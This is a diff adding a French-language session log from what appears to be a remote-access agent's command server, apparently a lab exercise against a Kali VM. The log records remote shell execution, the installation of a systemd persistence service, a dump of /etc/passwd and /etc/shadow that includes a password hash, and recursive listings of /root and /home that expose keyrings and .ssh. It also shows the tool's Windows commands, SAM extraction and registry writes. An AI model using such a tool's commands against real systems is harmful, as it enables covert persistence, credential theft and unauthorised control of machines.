@@ -1,0 +1,872 @@
+2025-11-09 06:05:49 - === NOUVELLE SESSION ===
+2025-11-09 06:05:49 - Client: kali (Linux)
+2025-11-09 06:05:49 - IP: ('192.168.100.3', 52642)
+
+2025-11-09 06:05:49 - 
+>>> Commande envoyée: whoami (ID: 1)
+2025-11-09 06:05:49 - <<< Réponse (Status: ok):
+2025-11-09 06:05:49 - root
+2025-11-09 06:05:49 - --------------------------------------------------------------------------------
+2025-11-09 06:05:50 - 
+>>> Commande envoyée: get_ips (ID: 2)
+2025-11-09 06:05:50 - <<< Réponse (Status: ok):
+2025-11-09 06:05:50 - lo:::1
+eth0:10.0.2.15
+eth0:fd17:625c:f037:2:997b:ab7c:f29f:60b3
+eth0:fe80::ff31:8e6d:65aa:9c54%eth0
+eth1:192.168.100.3
+2025-11-09 06:05:50 - --------------------------------------------------------------------------------
+2025-11-09 06:05:50 - 
+>>> Commande envoyée: list (ID: 3)
+2025-11-09 06:05:50 -     Arguments: {'path': '/home', 'max_depth': 1}
+2025-11-09 06:05:50 - <<< Réponse (Status: ok):
+2025-11-09 06:05:50 - /home:
+  <dir> kali
+/home/kali:
+  <dir> .pki
+  <dir> .local
+  <dir> .mozilla
+  <dir> Videos
+  <dir> Music
+  <dir> .cache
+  <dir> .vscode-oss
+  <dir> .config
+  <dir> .java
+  <dir> Downloads
+  <dir> Public
+  <dir> .gnupg
+  <dir> .BurpSuite
+  <dir> Templates
+  <dir> Pictures
+  <dir> Desktop
+  <dir> Documents
+  <dir> PyCharmMiscProject
+  .vboxclient-clipboard-tty7-service.pid
+  .xsession-errors.old
+  .dmrc
+  .python_history
+  .bashrc.original
+  .vboxclient-display-svga-x11-tty7-control.pid
+  .vboxclient-draganddrop-tty7-service.pid
+  .profile
+  .zprofile
+  .wget-hsts
+  .face
+  .vboxclient-draganddrop-tty7-control.pid
+  .Xauthority
+  .vboxclient-display-svga-x11-tty7-service.pid
+  .sudo_as_admin_successful
+  .bash_logout
+  .vboxclient-seamless-tty7-control.pid
+  .ICEauthority
+  .vboxclient-clipboard-tty7-control.pid
+  .zshrc
+  .vboxclient-vmsvga-session-tty7-control.pid
+  .vboxclient-hostversion-tty7-control.pid
+  .face.icon
+  .bashrc
+  .vboxclient-seamless-tty7-service.pid
+  .xsession-errors
+  .zsh_history
+  ip_info.txt
+2025-11-09 06:05:50 - --------------------------------------------------------------------------------
+2025-11-09 06:05:51 - 
+>>> Commande envoyée: uptime (ID: 4)
+2025-11-09 06:05:51 - <<< Réponse (Status: ok):
+2025-11-09 06:05:51 - up 0h 24m (from /proc/uptime)
+2025-11-09 06:05:51 - --------------------------------------------------------------------------------
+2025-11-09 06:05:51 - 
+>>> Commande envoyée: screenshot (ID: 5)
+2025-11-09 06:05:51 - <<< Réponse (Status: ok):
+2025-11-09 06:05:51 - mss not installed (pip install mss)
+2025-11-09 06:05:51 - --------------------------------------------------------------------------------
+2025-11-09 06:05:52 - 
+>>> Commande envoyée: run_shell (ID: 6)
+2025-11-09 06:05:52 -     Arguments: {'command': 'echo hello from server'}
+2025-11-09 06:05:52 - <<< Réponse (Status: ok):
+2025-11-09 06:05:52 - hello from server
+2025-11-09 06:05:52 - --------------------------------------------------------------------------------
+2025-11-09 06:05:52 - 
+>>> Commande envoyée: setup_autostart (ID: 7)
+2025-11-09 06:05:52 - <<< Réponse (Status: ok):
+2025-11-09 06:05:52 - systemd user service created at /root/.config/systemd/user/agent_ws.service (enable with: systemctl --user enable --now agent_ws)
+2025-11-09 06:05:52 - --------------------------------------------------------------------------------
+2025-11-09 06:05:53 - 
+>>> Commande envoyée: get_simulated_sensitive (ID: 8)
+2025-11-09 06:05:53 - <<< Réponse (Status: ok):
+2025-11-09 06:05:53 - Simulated sensitive data: DEMO_PASSWORD_12345
+2025-11-09 06:05:53 - --------------------------------------------------------------------------------
+2025-11-09 06:05:53 - 
+>>> Commande envoyée: get_sam (ID: 9)
+2025-11-09 06:05:53 - <<< Réponse (Status: ok):
+2025-11-09 06:05:53 - (commande Windows uniquement)
+2025-11-09 06:05:53 - --------------------------------------------------------------------------------
+2025-11-09 06:05:54 - 
+>>> Commande envoyée: add_registry (ID: 10)
+2025-11-09 06:05:54 -     Arguments: {'key_path': 'HKEY_CURRENT_USER\\Software\\TestKey', 'value_name': 'TestValue', 'value_data': 'HelloFromServer', 'value_type': 'REG_SZ'}
+2025-11-09 06:05:54 - <<< Réponse (Status: ok):
+2025-11-09 06:05:54 - (commande Windows uniquement)
+2025-11-09 06:05:54 - --------------------------------------------------------------------------------
+2025-11-09 06:05:54 - 
+>>> Commande envoyée: get_passwd_shadow (ID: 11)
+2025-11-09 06:05:54 - <<< Réponse (Status: ok):
+2025-11-09 06:05:54 - === /etc/passwd ===
+root:x:0:0:root:/root:/usr/bin/zsh
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+dhcpcd:x:100:65534:DHCP Client Daemon:/usr/lib/dhcpcd:/bin/false
+systemd-timesync:x:991:991:systemd Time Synchronization:/:/usr/sbin/nologin
+messagebus:x:990:990:System Message Bus:/nonexistent:/usr/sbin/nologin
+tss:x:101:104:TPM software stack:/var/lib/tpm:/bin/false
+strongswan:x:102:65534::/var/lib/strongswan:/usr/sbin/nologin
+tcpdump:x:103:105::/nonexistent:/usr/sbin/nologin
+sshd:x:989:65534:sshd user:/run/sshd:/usr/sbin/nologin
+_rpc:x:104:65534::/run/rpcbind:/usr/sbin/nologin
+dnsmasq:x:999:65534:dnsmasq:/var/lib/misc:/usr/sbin/nologin
+avahi:x:105:108:Avahi mDNS daemon:/run/avahi-daemon:/usr/sbin/nologin
+nm-openvpn:x:106:109:NetworkManager OpenVPN:/var/lib/openvpn/chroot:/usr/sbin/nologin
+speech-dispatcher:x:107:29:Speech Dispatcher:/run/speech-dispatcher:/bin/false
+usbmux:x:108:46:usbmux daemon:/var/lib/usbmux:/usr/sbin/nologin
+nm-openconnect:x:109:110:NetworkManager OpenConnect plugin:/var/lib/NetworkManager:/usr/sbin/nologin
+pulse:x:110:111:PulseAudio daemon:/run/pulse:/usr/sbin/nologin
+pipewire:x:988:988:system user for pipewire:/nonexistent:/usr/sbin/nologin
+lightdm:x:111:113:Light Display Manager:/var/lib/lightdm:/bin/false
+statd:x:112:65534::/var/lib/nfs:/usr/sbin/nologin
+saned:x:113:114::/var/lib/saned:/usr/sbin/nologin
+polkitd:x:987:987:User for polkitd:/:/usr/sbin/nologin
+rtkit:x:114:115:RealtimeKit:/proc:/usr/sbin/nologin
+colord:x:115:116:colord colour management daemon:/var/lib/colord:/usr/sbin/nologin
+mysql:x:116:118:MariaDB Server:/nonexistent:/bin/false
+stunnel4:x:986:986:stunnel service system account:/var/run/stunnel4:/usr/sbin/nologin
+geoclue:x:117:119::/var/lib/geoclue:/usr/sbin/nologin
+Debian-snmp:x:118:120::/var/lib/snmp:/bin/false
+sslh:x:119:121::/nonexistent:/usr/sbin/nologin
+cups-pk-helper:x:120:124:user for cups-pk-helper service:/nonexistent:/usr/sbin/nologin
+redsocks:x:121:125::/var/run/redsocks:/usr/sbin/nologin
+_gophish:x:122:127::/var/lib/gophish:/usr/sbin/nologin
+iodine:x:123:65534::/run/iodine:/usr/sbin/nologin
+miredo:x:124:65534::/var/run/miredo:/usr/sbin/nologin
+redis:x:125:128::/var/lib/redis:/usr/sbin/nologin
+postgres:x:126:129:PostgreSQL administrator:/var/lib/postgresql:/bin/bash
+mosquitto:x:127:130::/var/lib/mosquitto:/usr/sbin/nologin
+inetsim:x:128:131::/var/lib/inetsim:/usr/sbin/nologin
+_gvm:x:129:133::/var/lib/openvas:/usr/sbin/nologin
+kali:x:1000:1000::/home/kali:/usr/bin/zsh
+
+
+=== /etc/shadow ===
+root:*:20340:0:99999:7:::
+daemon:*:20340:0:99999:7:::
+bin:*:20340:0:99999:7:::
+sys:*:20340:0:99999:7:::
+sync:*:20340:0:99999:7:::
+games:*:20340:0:99999:7:::
+man:*:20340:0:99999:7:::
+lp:*:20340:0:99999:7:::
+mail:*:20340:0:99999:7:::
+news:*:20340:0:99999:7:::
+uucp:*:20340:0:99999:7:::
+proxy:*:20340:0:99999:7:::
+www-data:*:20340:0:99999:7:::
+backup:*:20340:0:99999:7:::
+list:*:20340:0:99999:7:::
+irc:*:20340:0:99999:7:::
+_apt:*:20340:0:99999:7:::
+nobody:*:20340:0:99999:7:::
+systemd-network:!*:20340:::::1:
+dhcpcd:!:20340::::::
+systemd-timesync:!*:20340:::::1:
+messagebus:!*:20340::::::
+tss:!:20340::::::
+strongswan:!:20340::::::
+tcpdump:!:20340::::::
+sshd:!*:20340::::::
+_rpc:!:20340::::::
+dnsmasq:!:20340::::::
+avahi:!:20340::::::
+nm-openvpn:!:20340::::::
+speech-dispatcher:!:20340::::::
+usbmux:!:20340::::::
+nm-openconnect:!:20340::::::
+pulse:!:20340::::::
+pipewire:!*:20340::::::
+lightdm:!:20340::::::
+statd:!:20340::::::
+saned:!:20340::::::
+polkitd:!*:20340::::::
+rtkit:!:20340::::::
+colord:!:20340::::::
+mysql:!:20340::::::
+stunnel4:!*:20340::::::
+geoclue:!:20340::::::
+Debian-snmp:!:20340::::::
+sslh:!:20340::::::
+cups-pk-helper:!:20340::::::
+redsocks:!:20340::::::
+_gophish:!:20340::::::
+iodine:!:20340::::::
+miredo:!:20340::::::
+redis:!:20340::::::
+postgres:!:20340::::::
+mosquitto:!:20340::::::
+inetsim:!:20340::::::
+_gvm:!:20340::::::
+kali:$y$j9T$ZjVER7AuUFBpA18/s0KpK1$zgO3ZVxVSDjjC.M6ltxfP22.SbNSM5SvZ9NW.MOrzS0:20340:0:99999:7:::
+
+2025-11-09 06:05:54 - --------------------------------------------------------------------------------
+2025-11-09 06:05:55 - 
+>>> Commande envoyée: list_root_home (ID: 12)
+2025-11-09 06:05:55 - <<< Réponse (Status: ok):
+2025-11-09 06:05:55 - === /root (récursif) ===
+root/
+  .bashrc.original
+  .profile
+  .face
+  .zshrc
+  .face.icon
+  .bashrc
+  .vboxclient-display-svga-x11-tty1-control.pid
+  .local/
+    share/
+      recently-used.xbel
+  .dbus/
+    session-bus/
+      686fa41363f049e9a84be345a7078e04-0
+  .ssh/
+  .cache/
+    dconf/
+      user
+  .config/
+    gtk-3.0/
+    systemd/
+      user/
+        agent_ws.service
+    dconf/
+      user
+
+=== /home (récursif) ===
+home/
+  kali/
+    .vboxclient-clipboard-tty7-service.pid
+    .xsession-errors.old
+    .dmrc
+    .python_history
+    .bashrc.original
+    .vboxclient-display-svga-x11-tty7-control.pid
+    .vboxclient-draganddrop-tty7-service.pid
+    .profile
+    .zprofile
+    .wget-hsts
+    .face
+    .vboxclient-draganddrop-tty7-control.pid
+    .Xauthority
+    .vboxclient-display-svga-x11-tty7-service.pid
+    .sudo_as_admin_successful
+    .bash_logout
+    .vboxclient-seamless-tty7-control.pid
+    .ICEauthority
+    .vboxclient-clipboard-tty7-control.pid
+    .zshrc
+    .vboxclient-vmsvga-session-tty7-control.pid
+    .vboxclient-hostversion-tty7-control.pid
+    .face.icon
+    .bashrc
+    .vboxclient-seamless-tty7-service.pid
+    .xsession-errors
+    .zsh_history
+    ip_info.txt
+    .pki/
+      nssdb/
+        cert9.db
+        pkcs11.txt
+        key4.db
+    .local/
+      state/
+        lesshst
+        wireplumber/
+          default-routes
+          stream-properties
+      bin/
+      share/
+        recently-used.xbel
+        xfce4-panel-profiles/
+        keyrings/
+          login.keyring
+          user.keystore
+        Mousepad/
+          autosave-0
+        icc/
+        JetBrains/
+          PyCharm2025.2/
+            tasks/
+              lib/
+                jsonpath.jar
+                commons-discovery.jar
+                xmlrpc.jar
+                axis.jar
+                tasks-core.jar
+                http-client.jar
+            vuejs/
+              lib/
+                vuejs.jar
+                commons-text.jar
+              typescript-vue-plugin/
+                node_modules/
+                  @vue/
+                    typescript-plugin/
+                      package.json
+                      package-lock.json
+                      README.md
+                      rolldown.config.ts
+                      index.js
+              vue-language-server/
+                .gitignore
+                package.json
+                package-lock.json
+                README.md
+                build.js
+                bin/
+                  vue-language-server.js
+              vue-service/
+                node_modules/
+                  entities/
+                    package.json
+                    LICENSE
+                    readme.md
+                    lib/
+                      decode_codepoint.js
+                      decode.js
+                      encode.js
+                      index.js
+                      maps/
+                        xml.json
+                        entities.json
+                        legacy.json
+                        decode.json
+                  htmlparser2/
+                    package.json
+                    README.md
+                    LICENSE
+                    lib/
+                      FeedHandler.js
+                      Parser.js
+                      WritableStream.js
+                      MultiplexHandler.js
+                      CollectingHandler.js
+                      index.js
+                      Tokenizer.js
+                  ws-typescript-vue-plugin/
+                    package.json
+                    vueScriptCache.js
+                    transformVueSfcFile.js
+                    index.js
+            vcs-svn/
+              lib/
+                vcs-svn.jar
+                sqlite.jar
+          consentOptions/
+            accepted
+        ristretto/
+        Trash/
+          files/
+            code_1.105.1-1760482543_amd64.deb
+            pycharm-2025.2.3.tar.gz
+          info/
+            pycharm-2025.2.3.tar.gz.trashinfo
+            code_1.105.1-1760482543_amd64.deb.trashinfo
+        gvfs-metadata/
+          root-c24f14f8.log
+          home-f0184c1f.log
+          home
+          root
+        virtualenv/
+          wheel/
+            house/
+              pip-25.1.1-py3-none-any.whl
+              pip-25.2-py3-none-any.whl
+              pip-25.1.1-py3-none-any.whl.lock
+            3.13/
+              embed/
+                3/
+                  pip.json
+              image/
+                1/
+                  CopyPipInstall/
+                    pip-25.1.1-py3-none-any.lock
+                    pip-25.1.1-py3-none-any/
+                      pip-25.1.1.virtualenv
+                      pip-25.1.1.dist-info/
+                        top_level.txt
+                        METADATA
+                        WHEEL
+                        INSTALLER
+                        RECORD
+                        entry_points.txt
+                        licenses/
+                          AUTHORS.txt
+                          LICENSE.txt
+                      pip/
+                        py.typed
+                        __pip-runner__.py
+                        __init__.py
+                        __main__.py
+                        _vendor/
+                          __init__.py
+                          vendor.txt
+                          typing_extensions.py
+                          cachecontrol/
+                            py.typed
+                            _cmd.py
+                            heuristics.py
+                            __init__.py
+                            adapter.py
+                            serialize.py
+                            controller.py
+                            cache.py
+                            wrapper.py
+                            filewrapper.py
+                            caches/
+                              __init__.py
+                              redis_cache.py
+                              file_cache.py
+                          certifi/
+                            py.typed
+                            core.py
+                            __init__.py
+                            __main__.py
+                            cacert.pem
+                          msgpack/
+                            __init__.py
+                            fallback.py
+                            exceptions.py
+                            ext.py
+                          tomli_w/
+                            py.typed
+                            _writer.py
+                            __init__.py
+                          rich/
+                            bar.py
+                            scope.py
+                            color_triplet.py
+                            file_proxy.py
+                            json.py
+                            py.typed
+                            padding.py
+                            _spinners.py
+                            layout.py
+                            logging.py
+                            _timer.py
+                            _win32_console.py
+                            region.py
+                            status.py
+                            text.py
+                            default_styles.py
+                            theme.py
+                            live.py
+                            _log_render.py
+                            control.py
+                            syntax.py
+                            filesize.py
+                            prompt.py
+                            cells.py
+                            repr.py
+                            measure.py
+                            __init__.py
+                            _wrap.py
+                            columns.py
+                            _extension.py
+                            _stack.py
+                            align.py
+                            _fileno.py
+                            color.py
+                            screen.py
+                            panel.py
+                            diagnose.py
+                            segment.py
+                            palette.py
+                            constrain.py
+                            progress_bar.py
+                            progress.py
+                            pretty.py
+                            _emoji_replace.py
+                            emoji.py
+                            style.py
+                            _palettes.py
+                            rule.py
+                            terminal_theme.py
+                            protocol.py
+                            ... (28 fichiers supplémentaires)
+                          idna/
+                            py.typed
+                            core.py
+                            codec.py
+                            __init__.py
+                            idnadata.py
+                            package_data.py
+                            uts46data.py
+                            compat.py
+                            intranges.py
+                          requests/
+                            __init__.py
+                            certs.py
+                            status_codes.py
+                            api.py
+                            _internal_utils.py
+                            packages.py
+                            exceptions.py
+                            cookies.py
+                            structures.py
+                            utils.py
+                            compat.py
+                            __version__.py
+                            models.py
+                            auth.py
+                            adapters.py
+                            sessions.py
+                            hooks.py
+                            help.py
+                          resolvelib/
+                            py.typed
+                            structs.py
+                            __init__.py
+                            providers.py
+                            reporters.py
+                            resolvers/
+                              __init__.py
+                              criterion.py
+                              resolution.py
+                              exceptions.py
+                              abstract.py
+                          urllib3/
+                            _version.py
+                            response.py
+                            __init__.py
+                            connectionpool.py
+                            fields.py
+                            exceptions.py
+                            poolmanager.py
+                            filepost.py
+                            _collections.py
+                            request.py
+                            connection.py
+                            packages/
+                              six.py
+                              __init__.py
+                              backports/
+                                __init__.py
+                                weakref_finalize.py
+                                makefile.py
+                            util/
+                              retry.py
+                              url.py
+                              response.py
+                              queue.py
+                              __init__.py
+                              wait.py
+                              ssl_.py
+                              ssl_match_hostname.py
+                              ssltransport.py
+                              request.py
+                              proxy.py
+                              timeout.py
+                              connection.py
+                            contrib/
+                              ntlmpool.py
+                              __init__.py
+                              securetransport.py
+                              _appengine_environ.py
+                              pyopenssl.py
+                              socks.py
+                              appengine.py
+                              _securetransport/
+                                __init__.py
+                                bindings.py
+                                low_level.py
+                          distlib/
+                            t64.exe
+                            manifest.py
+                            w64-arm.exe
+                            util.py
+                            scripts.py
+                            metadata.py
+                            wheel.py
+                            markers.py
+                            index.py
+                            t64-arm.exe
+                            __init__.py
+                            t32.exe
+                            w64.exe
+                            compat.py
+                            w32.exe
+                            database.py
+                            version.py
+                            locators.py
+                            resources.py
+                          truststore/
+                            py.typed
+                            _macos.py
+                            _api.py
+                            __init__.py
+                            _openssl.py
+                            _ssl_constants.py
+                            _windows.py
+                          pyproject_hooks/
+                            py.typed
+                            __init__.py
+                            _impl.py
+                            _in_process/
+                              __init__.py
+                              _in_process.py
+                          packaging/
+                            py.typed
+                            specifiers.py
+                            tags.py
+                            metadata.py
+                            markers.py
+                            _manylinux.py
+                            __init__.py
+                            requirements.py
+                            _structures.py
+                            _parser.py
+                            utils.py
+                            _tokenizer.py
+                            version.py
+                            _musllinux.py
+                            _elffile.py
+                            licenses/
+                              _spdx.py
+                              __init__.py
+                          pygments/
+                            sphinxext.py
+                            util.py
+                            modeline.py
+                            plugin.py
+                            unistring.py
+                            __init__.py
+                            lexer.py
+                            token.py
+                            formatter.py
+                            scanner.py
+                            filter.py
+                            style.py
+                            regexopt.py
+                            __main__.py
+                            console.py
+                            filters/
+                              __init__.py
+                            lexers/
+                              __init__.py
+                              _mapping.py
+                              python.py
+                            formatters/
+                              __init__.py
+                              _mapping.py
+                            styles/
+                              __init__.py
+                              _mapping.py
+                          tomli/
+                            py.typed
+                            _types.py
+                            __init__.py
+                            _parser.py
+                            _re.py
+                          platformdirs/
+                            py.typed
+                            macos.py
+                            __init__.py
+                            api.py
+                            android.py
+                            __main__.py
+                            version.py
+                            windows.py
+                            unix.py
+                          pkg_resources/
+                            __init__.py
+                          distro/
+                            py.typed
+                            __init__.py
+                            __main__.py
+                            distro.py
+                          dependency_groups/
+                            py.typed
+                            _pip_wrapper.py
+                            _lint_dependency_groups.py
+                            __init__.py
+                            _implementation.py
+                            __main__.py
+                            _toml_compat.py
+                        _internal/
+                          build_env.py
+                          self_outdated_check.py
+                          __init__.py
+                          pyproject.py
+                          wheel_builder.py
+                          exceptions.py
+                          main.py
+                          configuration.py
+                          cache.py
+                          resolution/
+                            base.py
+                            __init__.py
+                            legacy/
+                              __init__.py
+                              resolver.py
+                            resolvelib/
+                              candidates.py
+                              found_candidates.py
+                              reporter.py
+                              base.py
+                              __init__.py
+                              factory.py
+                              provider.py
+                              requirements.py
+                              resolver.py
+                          locations/
+                            base.py
+                            __init__.py
+                            _sysconfig.py
+                            _distutils.py
+                          cli/
+                            progress_bars.py
+                            command_context.py
+                            parser.py
+                            __init__.py
+                            status_codes.py
+                            main_parser.py
+                            cmdoptions.py
+                            index_command.py
+                            main.py
+                            spinners.py
+                            autocompletion.py
+                            base_command.py
+                            req_command.py
+                          index/
+                            __init__.py
+                            sources.py
+                            package_finder.py
+                            collector.py
+                          models/
+                            wheel.py
+                            index.py
+                            search_scope.py
+                            direct_url.py
+                            __init__.py
+                            format_control.py
+                            pylock.py
+                            link.py
+                            scheme.py
+                            selection_prefs.py
+                            candidate.py
+                            target_python.py
+                            installation_report.py
+                          commands/
+                            wheel.py
+                            index.py
+                            lock.py
+                            show.py
+                            __init__.py
+                            completion.py
+                            hash.py
+                            uninstall.py
+                            search.py
+                            check.py
+                            configuration.py
+                            cache.py
+                            freeze.py
+                            list.py
+                            inspect.py
+                            download.py
+                            debug.py
+                            install.py
+                            help.py
+                          req/
+                            req_install.py
+                            req_uninstall.py
+                            constructors.py
+                            req_set.py
+                            __init__.py
+                            req_dependency_group.py
+                            req_file.py
+                          network/
+                            __init__.py
+                            session.py
+                            utils.py
+                            cache.py
+                            lazy_wheel.py
+                            auth.py
+                            xmlrpc.py
+                            download.py
+                          distributions/
+                            wheel.py
+                            base.py
+                            __init__.py
+                            installed.py
+                            sdist.py
+                          operations/
+                            __init__.py
+                            check.py
+                            freeze.py
+                            prepare.py
+                            install/
+                              wheel.py
+                              __init__.py
+                              editable_legacy.py
+                            build/
+                              metadata.py
+                              wheel.py
+                              metadata_editable.py
+                              metadata_legacy.py
+                              __init__.py
+                              wheel_editable.py
+                              build_tracker.py
+                              wheel_legacy.py
+                          utils/
+                            urls.py
+                            compatibility_tags.py
+                            setuptools_build.py
+                            packaging.py
+                            retry.py
+                            misc.py
+                            unpacking.py
+                            logging.py
+                            wheel.py
+                            appdirs.py
+                            _log.py
+                            __init__.py
+                            filetypes.py
+                            direct_url_helpers.py
+                            deprecation.py
+                            egg_link.py
+                            hashes.py
+                            entrypoints.py
+                            glibc.py
+                            compat.py
+                            datetime.py
+                            _jaraco_text.py
+                            temp_dir.py
+                            virtualenv.py
+                            filesystem.py
+                            subprocess.py
+                          vcs/
+                            git.py
+                            versioncontrol.py
+... (liste tronquée à 500 entrées)
+2025-11-09 06:05:55 - --------------------------------------------------------------------------------
+2025-11-09 06:05:55 - 
+>>> Commande envoyée: bye (ID: 0)
